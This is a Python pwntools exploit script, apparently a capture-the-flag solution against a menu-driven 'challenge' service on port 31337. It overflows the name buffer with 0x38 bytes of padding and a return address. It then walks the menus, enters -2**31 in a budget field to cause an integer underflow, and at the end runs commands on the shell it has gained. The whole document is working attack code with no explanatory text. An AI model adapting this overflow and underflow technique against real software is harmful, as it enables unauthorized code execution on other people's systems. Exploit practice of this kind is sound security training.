#!/bin/python3

from pwn import *

# io = process('./challenge')
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))

io.recvuntil('Enter your name: ')
io.sendline(b'A' * 0x38 + p64(0x04015ef))

io.sendlineafter('Choice: ', 'D')
io.sendlineafter('Choice: ', 'H')
io.sendlineafter('name: ', 'agent')

io.sendlineafter('Choice: ', 'X')
io.sendlineafter('Choice: ', 'A')
io.sendlineafter('Choice: ', 'C')
io.sendlineafter('name: ', 'campaign')
io.sendlineafter('budget: ', '1')
io.sendlineafter('Region: ', '1')
io.sendlineafter('Choice: ', '0')
io.sendlineafter('Agent ID: ', '1')

for i in range(1, 6):
    io.sendlineafter(f'Keyword {i}: ', '')

io.sendlineafter('Choice: ', 'E')
io.sendlineafter('cancel): ', '1')
io.sendlineafter('$1): ', str(-2**31))
io.sendlineafter('n): ', 'n')
io.sendlineafter('n): ', 'n')

io.sendlineafter('Choice: ', 'E')
io.sendlineafter('cancel): ', '1')
io.sendlineafter('): ', '1000000000')
io.sendlineafter('n): ', 'n')
io.sendlineafter('n): ', 'n')

io.sendlineafter('Choice: ', 'X')
io.sendlineafter('Choice: ', 'N')

io.sendline("./submitter ; echo shell ; exit")
print(io.readallS())
